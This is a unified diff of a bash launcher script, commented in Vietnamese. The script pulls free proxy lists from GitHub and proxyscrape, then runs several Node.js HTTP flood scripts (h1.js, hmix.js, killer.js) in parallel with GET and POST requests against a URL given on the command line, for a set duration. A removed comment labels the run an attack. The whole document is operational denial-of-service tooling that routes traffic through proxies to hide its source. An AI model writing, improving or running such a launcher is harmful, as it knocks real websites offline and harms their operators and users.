@@ -1,42 +1,27 @@
 #!/bin/bash
 
-# Cài đặt các module cần thiết
-# npm install colors randomstring user-agents hpack axios https commander socks node-telegram-bot-api
-
-# Kiểm tra số lượng tham số
-if [ $# -lt 2 ]; then
-    echo "Usage: $0 {URL} {TIME}"
-    exit 1
-fi
+# Usage: ./script.sh <URL> <TIME> 
+[ $# -lt 2 ] && echo "Usage: $0 {URL} {TIME}" && exit 1
 
 URL=$1
 TIME=$2
-tep_tam=$(mktemp)
-tong=0
-export NODE_OPTIONS=--max-old-space-size=8192
 
-# Lấy proxy từ các loại HTTP, HTTPS, SOCKS4, SOCKS5
-for loai in http https socks4 socks5; do 
-  lien_ket="https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/$loai/Vietnam.txt"
-  so_luong=$(curl -s "$lien_ket" | tee -a "$tep_tam" | wc -l)
-  echo "$loai: $so_luong proxy"
-  ((tong+=so_luong))
+# Tải proxy vào live.txt cho cả HTTP, HTTPS   
+> live.txt
+for t in http; do
+curl -s "https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/$t/Vietnam.txt" >> live.txt
+echo >> live.txt  # xuống dòng sau lần 1
+curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=all&ssl=all&anonymity=all&timeout=2000&protocol=$t" >> live.txt
 done
-
-echo "Tổng trước lọc: $tong"
-sort -u "$tep_tam" -o live.txt
-echo "Tổng sau lọc: $(wc -l < live.txt) | IP duy nhất: $(awk -F: '{print $1}' live.txt | sort -u | wc -l)"
-rm -f "$tep_tam"
 wait
 
-# Chạy tấn công với h1.js
-for method in GET; do 
-  node h1.js "$method" "$URL" live.txt "$TIME" 1 1 &
+
+# Chạy các script node 
+for m in POST GET; do
+  node hmix.js -m $m -u $URL -s $TIME -p live.txt -r 38 --full true -d false &  
+  node h1.js $m $URL live.txt $TIME 999 10 randomstring=true &
+  #node killer.js $m $URL $TIME 2 2 live.txt --query 1 --referer rand --http 2 --close --parsed --reset &
 done
 
-
-
 wait
-
-# Dừng tất cả tiến trình liên quan
-pgrep -f "negan.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js" | xargs -r kill -9
+pgrep -f "hmix.js|h1.js|h2.js|http1.js|http2.js|killer.js" | xargs -r kill -9
